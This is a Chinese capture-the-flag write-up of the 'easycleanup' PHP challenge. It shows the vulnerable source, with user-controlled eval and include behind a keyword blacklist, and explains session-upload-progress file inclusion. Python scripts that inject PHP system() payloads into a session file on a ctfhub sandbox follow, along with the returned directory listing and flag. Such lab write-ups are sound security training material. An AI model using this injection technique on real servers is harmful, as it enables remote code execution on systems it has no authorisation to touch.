::: info
2021-第五届空间智能安全大赛-easycleanup
:::

## 1、思路

（1）代码分析

```php
<?php

if(!isset($_GET['mode'])){
    highlight_file(__file__);
}else if($_GET['mode'] == "eval"){
    $shell = $_GET['shell'] ?? 'phpinfo();';
    if(strlen($shell) > 15 | filter($shell) | checkNums($shell)) exit("hacker");
    eval($shell);
}


if(isset($_GET['file'])){
    if(strlen($_GET['file']) > 15 | filter($_GET['file'])) exit("hacker");
    include $_GET['file'];
}


function filter($var): bool{
    $banned = ["while", "for", "\$_", "include", "env", "require", "?", ":", "^", "+", "-", "%", "*", "`"];

    foreach($banned as $ban){
        if(strstr($var, $ban)) return True;
    }

    return False;
}

function checkNums($var): bool{
    $alphanum = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $cnt = 0;
    for($i = 0; $i < strlen($alphanum); $i++){
        for($j = 0; $j < strlen($var); $j++){
            if($var[$j] == $alphanum[$i]){
                $cnt += 1;
                if($cnt > 8) return True;
            }
        }
    }
    return False;
}
?>
```

- mode 参数	
  - 未设置则 `highlight_file(__file__); `，highlight_file 用于在网页上将指定文件的源代码以语法高亮的形式展示，\__file__ 代表当前文件的路径，因此 highlight_file() 函数将读取该文件的内容并对其进行语法高亮处理后输出到网页上
  - 若 `$_GET['mode'] == "eval"` 则执行 `$shell = $_GET['shell'] ?? 'phpinfo();';`
    - 未设置 shell 参数则返回 phpinfo();
    - 对 shell 参数进行检查
      - `strlen($shell) > 15` 
      - `filter($shell)` 
        - "while", "for", "\$_", "include", "env", "require", "?", ":", "^", "+", "-", "%", "*", "`"
      - `checkNums($shell)`
        - 检查是否包含至少 8 个字母或数字字符
- file 参数
  - `strlen($_GET['file']) > 15`  
  - `filter($_GET['file'])`
    - "while", "for", "\$_", "include", "env", "require", "?", ":", "^", "+", "-", "%", "*", "`"
  - `include $_GET['file'];`
    - 可以通过利用一些技巧让服务存储我们恶意生成的文件，该文件包含我们构造的的恶意代码，此时服务器就存在我们可以包含的文件了

## 2、文件包含

### session 文件包含

session 文件包含是一种安全漏洞，当 PHP 使用 include 或 require 函数来包含的会话文件路径是从用户控制的输入中获取时，它允许攻击者通过篡改会话文件来执行恶意代码

phpinfo() 中对 session 的支持

| Session Support                    | enabled                          |
| ---------------------------------- | -------------------------------- |
| **Registered save handlers**       | **files user**                   |
| **Registered serializer handlers** | **php_serialize php php_binary** |

| Directive                           | Local Value                 | Master Value                |
| ----------------------------------- | --------------------------- | --------------------------- |
| session.auto_start                  | Off                         | Off                         |
| session.cache_expire                | 180                         | 180                         |
| session.cache_limiter               | nocache                     | nocache                     |
| session.cookie_domain               | *no value*                  | *no value*                  |
| session.cookie_httponly             | *no value*                  | *no value*                  |
| session.cookie_lifetime             | 0                           | 0                           |
| session.cookie_path                 | /                           | /                           |
| session.cookie_samesite             | *no value*                  | *no value*                  |
| session.cookie_secure               | 0                           | 0                           |
| session.gc_divisor                  | 1000                        | 1000                        |
| session.gc_maxlifetime              | 1440                        | 1440                        |
| session.gc_probability              | 1                           | 1                           |
| session.lazy_write                  | On                          | On                          |
| session.name                        | PHPSESSID                   | PHPSESSID                   |
| session.referer_check               | *no value*                  | *no value*                  |
| session.save_handler                | files                       | files                       |
| session.save_path                   | *no value*                  | *no value*                  |
| session.serialize_handler           | php                         | php                         |
| session.sid_bits_per_character      | 5                           | 5                           |
| session.sid_length                  | 26                          | 26                          |
| **session.upload_progress.cleanup** | **Off**                     | **Off**                     |
| session.upload_progress.enabled     | On                          | On                          |
| session.upload_progress.freq        | 1%                          | 1%                          |
| session.upload_progress.min_freq    | 1                           | 1                           |
| session.upload_progress.name        | PHP_SESSION_UPLOAD_PROGRESS | PHP_SESSION_UPLOAD_PROGRESS |
| session.upload_progress.prefix      | upload_progress_            | upload_progress_            |
| session.use_cookies                 | 1                           | 1                           |
| session.use_only_cookies            | 1                           | 1                           |
| session.use_strict_mode             | 0                           | 0                           |
| session.use_trans_sid               | 0                           | 0                           |

 session.upload_progress.cleanup 是 PHP 中用于配置上传文件进度监视器的选项之一。它用于定义是否在上传完成后自动清理上传进度数据。默认情况下，该选项设置为 On，这意味着当文件上传完成后，PHP 会自动清理掉与该上传进度相关的数据，这样可以避免上传进度数据占用服务器资源。

因为 session.upload_progress.cleanup 没有开启，不会及时的清理 session 文件，所以直接传文件，然后用题目中的 include 包含进去就可以了。

`PHP_SESSION_UPLOAD_PROGRESS` 是一个 PHP 的预定义常量，用于存储上传文件进度的会话变量名。在 PHP 中，当上传文件时，可以使用这个会话变量来跟踪文件上传的进度。

在 Cookie 里设置 PHPSESSID=flag，PHP 将会在服务器上创建一个文件：/tmp/sess_flag

### 执行恶意代码

`requests.Session()` 

- 自定义 `cookies={ 'PHPSESSID': sessid }`

- 注入恶意代码 `data={ 'PHP_SESSION_UPLOAD_PROGRESS': '<?php system('ls /')?>' }`
- `files={ 'file': file}`

```python
		res = requests.session().post(
        url=url, 
        data={ "PHP_SESSION_UPLOAD_PROGRESS": "<?php system('ls /');?>" }, 
        files={ 'file': file }, 
        cookies={ 'PHPSESSID': sessid }
        )
```

直接访问 `url/?file=/tmp/sess_<sessid>`

显示

```
upload_progress_|a:5:{s:10:"start_time";i:1710472614;s:14:"content_length";i:283;s:15:"bytes_processed";i:283;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:4:"file";s:4:"name";s:4:"file";s:8:"tmp_name";s:14:"/tmp/phpdc9UCP";s:5:"error";i:0;s:4:"done";b:1;s:10:"start_time";i:1710472614;s:15:"bytes_processed";i:8;}}}upload_progress_bin boot dev etc flag_is_here_not_are_but_you_find home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var |a:5:{s:10:"start_time";i:1710473383;s:14:"content_length";i:278;s:15:"bytes_processed";i:278;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:4:"file";s:4:"name";s:4:"file";s:8:"tmp_name";s:14:"/tmp/phpWslbzp";s:5:"error";i:0;s:4:"done";b:1;s:10:"start_time";i:1710473383;s:15:"bytes_processed";i:8;}}}
```

## 3、exp

（1）获取 flag 位置：flag_is_here_not_are_but_you_find

```python
import requests


url = "http://challenge-d360e9f051a3b562.sandbox.ctfhub.com:10800"
file = "test.txt"
session_id = "flag"


if __name__ == '__main__':
    res = requests.session().post(
        url=url, 
        data={ "PHP_SESSION_UPLOAD_PROGRESS": "<?php system('ls /')?>" }, 
        files={ 'file': file }, 
        cookies={ 'PHPSESSID': session_id }
        )
    print(res.text)
```

显示

```
upload_progress_|a:5:{s:10:"start_time";i:1710472614;s:14:"content_length";i:283;s:15:"bytes_processed";i:283;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:4:"file";s:4:"name";s:4:"file";s:8:"tmp_name";s:14:"/tmp/phpdc9UCP";s:5:"error";i:0;s:4:"done";b:1;s:10:"start_time";i:1710472614;s:15:"bytes_processed";i:8;}}}upload_progress_bin boot dev etc flag_is_here_not_are_but_you_find home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var |a:5:{s:10:"start_time";i:1710473383;s:14:"content_length";i:278;s:15:"bytes_processed";i:278;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:4:"file";s:4:"name";s:4:"file";s:8:"tmp_name";s:14:"/tmp/phpWslbzp";s:5:"error";i:0;s:4:"done";b:1;s:10:"start_time";i:1710473383;s:15:"bytes_processed";i:8;}}}
```

（2）获取 flag

```python
import requests


url = "http://challenge-d360e9f051a3b562.sandbox.ctfhub.com:10800"
file = "test.txt"
session_id = "flag"


if __name__ == '__main__':
    res = requests.session().post(
        url=url, 
        data={ "PHP_SESSION_UPLOAD_PROGRESS": "<?php system('cat /flag_is_here_not_are_but_you_find');?>" }, 
        files={ 'file': file }, 
        cookies={ 'PHPSESSID': session_id }
        )
    print(res.text)
```

显示

```
{s:10:"field_name";s:4:"file";s:4:"name";s:4:"file";s:8:"tmp_name";s:14:"/tmp/phpLOMfc2";s:5:"error";i:0;s:4:"done";b:1;s:10:"start_time";i:1710473906;s:15:"bytes_processed";i:8;}}}upload_progress_ctfhub{3c445a74790912aad2150c33} |a:5:{s:10:"start_time";i:1710473945;s:14:"content_length";i:313;s:15:"bytes_processed";i:313;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:
```

得到 flag：ctfhub{3c445a74790912aad2150c33}